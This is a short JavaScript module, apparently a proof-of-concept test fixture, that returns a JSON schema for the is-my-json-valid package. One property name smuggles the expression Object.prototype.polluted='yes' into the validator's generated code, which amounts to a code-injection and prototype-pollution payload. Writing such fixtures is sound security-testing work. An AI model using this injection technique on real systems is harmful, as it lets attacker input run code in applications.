function getPayload() {
  const fs = require("fs");
  const path = "./is-my-json-valid";
  const schema = {
    type: "object",
    properties: {
      "x[1 + (Object.prototype.polluted='yes')]": {
        required: true,
        type: "string",
      },
    },
  };

  return {
    schema,
    path
  };
}

module.exports = { getPayload };